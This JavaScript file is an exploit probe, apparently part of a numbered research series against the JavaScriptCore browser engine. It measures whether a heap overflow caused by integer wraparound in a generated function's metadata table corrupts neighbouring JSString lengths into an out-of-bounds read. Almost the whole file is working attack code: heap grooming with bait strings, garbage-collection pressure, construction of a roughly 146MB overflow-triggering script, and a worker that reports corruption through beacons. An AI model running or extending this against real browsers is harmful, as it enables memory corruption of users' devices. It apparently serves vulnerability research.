// p161 — Length-window audit: does `.length = 81400` give an out-of-bounds read?
//
// p146 recorded `.length = 81400` on 100,000-character JSStrings and the
// findings doc concluded that charCodeAt() then reads past the 100,000-byte
// buffer. 81400 < 100000, so that conclusion does not follow: JSC's
// charCodeAt path checks `index < JSString::length()` (JSString::canGetIndex)
// before touching the buffer, so a corrupted length that is SMALLER than the
// real capacity narrows the readable window instead of widening it.
//
// This probe makes that measurable on device:
//   - corrupt the header as p146 does
//   - report the corrupted length
//   - probe index (length-1)  -> must still be canary, inside the buffer
//   - probe index 99999       -> must be NaN, i.e. outside the JSString window
//                                but inside the real character buffer
//   - probe index length+1    -> must be NaN
//
// The third result is the decisive one: byte 99999 exists (the string was
// built from 100,000 characters) yet JS refuses to reach it. That is a
// length-window shrink, not an OOB primitive.
//
// Second purpose: mode=single builds `a();` x N and mode=pair builds
// `a();b();` x N/2 (same source size, two identifier keys instead of one).
// If the written length value differs between them, the value comes from
// metadata content and might be steerable; if identical, it is a fixed
// offset/constant in the table.
//
// Usage: http://<host>/probe/p161-length-window.js?mode=single
//        http://<host>/probe/p161-length-window.js?mode=pair
// Beacons: V161-*

(function() {
  var Q = location.search || '';
  function param(name, def) {
    var m = Q.match(new RegExp('[?&]' + name + '=([^&]*)'));
    return m ? decodeURIComponent(m[1]) : def;
  }

  var MODE = param('mode', 'single');

  // The wrap happens only at the full count: 38348816 * 112 = 2^32 + 100096.
  // Lower values are for harness smoke tests only and cannot corrupt anything.
  var CALLS = parseInt(param('calls', '38348816'), 10) || 38348816;
  if (CALLS < 4096) CALLS = 4096;
  if (CALLS > 38348816) CALLS = 38348816;

  var BASE = location.protocol + '//' + location.host;

  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V161-' + MODE + '-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  // ── WORKER: owns the target strings ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V161W-' + tag + '?t=' + Date.now(), false);
        x.send();
      } catch (e) {}
    }

    function mkString(ch) {
      var s = '';
      var block = '';
      for (var j = 0; j < 1000; j++) block += ch;
      for (var k = 0; k < STR_LEN / 1000; k++) s += block;
      s = s.substring(0, STR_LEN);
      s.charCodeAt(0); // force StringImpl materialization
      return s;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }

      if (e.data.cmd === 'alloc') {
        for (var i = 0; i < e.data.count; i++) targets.push(mkString('A'));
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = false;
        var iter = 0;

        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              beacon('LEN-' + i + '-' + targets[i].length);
              found = true;
              break;
            }
          }
          iter++;
          if (iter % 500000 === 0) beacon('POLL-' + iter);
        }

        // Every string, not just the first hit: p146 saw all 14 corrupted.
        for (var i = 0; i < targets.length; i++) {
          var s = targets[i];
          var len = s.length;
          if (len === STR_LEN) continue;

          beacon('HDR-' + i + '-len=' + len);

          // (1) last byte of the narrowed window — inside the real buffer
          var last = s.charCodeAt(len - 1);
          beacon('LAST-' + i + '-' + last + '-' + (last === CANARY ? 'CANARY' : 'OTHER'));

          // (2) byte 99999 — exists in the buffer, outside the JSString window
          var tail = s.charCodeAt(STR_LEN - 1);
          beacon('TAIL-' + i + '-' + (isNaN(tail) ? 'NaN' : String(tail)));

          // (3) one past the corrupted window
          var past = s.charCodeAt(len);
          beacon('PAST-' + i + '-' + (isNaN(past) ? 'NaN' : String(past)));

          // (4) the real capacity is unchanged: substring still sees 100,000
          beacon('SUB-' + i + '-' + s.substring(0, 10).length + '-' + (s.substring(0, 10).charCodeAt(0) === CANARY ? 'OK' : 'BAD'));
        }

        self.postMessage({ done: true });
        return;
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  // ── PHASE 1: baits in the 102,400-byte marge slot ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  var baits = [];
  B('BAIT-START');
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    var block = '';
    for (var j = 0; j < 1000; j++) block += 'B';
    for (var k = 0; k < STR_LEN / 1000; k++) bait += block;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-DONE-' + N_BAIT);

  worker.onmessage = function(e) {
    if (e.data.ready) freeBaits();
    if (e.data.done) B('WORKER-DONE');
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', count: 14 });

  function freeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var round = 0;
    function gcRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(round);
      round++;
      if (round < 30) setTimeout(gcRound, 30);
      else {
        B('GC-PRESSURE-' + round);
        buildOverflow();
      }
    }
    gcRound();
  }

  function buildOverflow() {
    B('BUILD-START');

    // Same wrap as p142/p146: 38348816 * 112 = 2^32 + 100096, so the
    // allocated table is one 102,400-byte slot and the write runs far past it.
    var N_OVERFLOW = CALLS;
    var CHUNK = 4000000;
    var units = MODE === 'pair' ? [ 'a();', 'b();' ] : [ 'a();' ];
    var perChunkCalls = Math.floor(CHUNK / units.length);
    // Each chunk must carry perChunkCalls repetitions of the unit text. The
    // committed version pushed units.join('') once per chunk (8 bytes), so the
    // generated function held ~2.35M op_calls and the metadata table never
    // wrapped — caught on device (third console): BLOB-9MB instead of ~146MB,
    // SURVIVED, and the worker polled forever with zero corruption.
    var chunkText = '';
    for (var u = 0; u < perChunkCalls; u++) chunkText += units.join('');

    var parts = ['window.__v161fn=function(a,b){'];
    var chunks = Math.floor(N_OVERFLOW / (perChunkCalls * units.length) );

    // restore with the exact remaining call count
    var callsDone = 0;
    var pieces = [];
    for (var c = 0; c < chunks; c++) {
      pieces.push(chunkText);
      callsDone += perChunkCalls * units.length;
    }
    var rest = N_OVERFLOW - callsDone;
    for (var r = 0; r < rest; r++) pieces.push(units[r % units.length]);
    pieces.push('};window.__v161ok=true;');
    parts = parts.concat(pieces);

    var blob = new Blob(parts, { type: 'application/javascript' });
    var mb = blob.size / 1048576;
    B('BLOB-' + (mb >= 1 ? mb.toFixed(0) + 'MB' : (blob.size / 1024).toFixed(0) + 'KB') + '-calls=' + N_OVERFLOW);
    pieces = null;
    parts = null;

    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__v161ok ? 'OK' : 'FAIL'));
      if (!window.__v161fn) { B('NO-FN'); return; }

      worker.postMessage({ cmd: 'watch' });
      setTimeout(function() {
        B('CALLING');
        try {
          window.__v161fn(function(){}, function(){});
        } catch (ex) {
          B('CATCH-' + ((ex && ex.message) || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = URL.createObjectURL(blob);
  }
})();
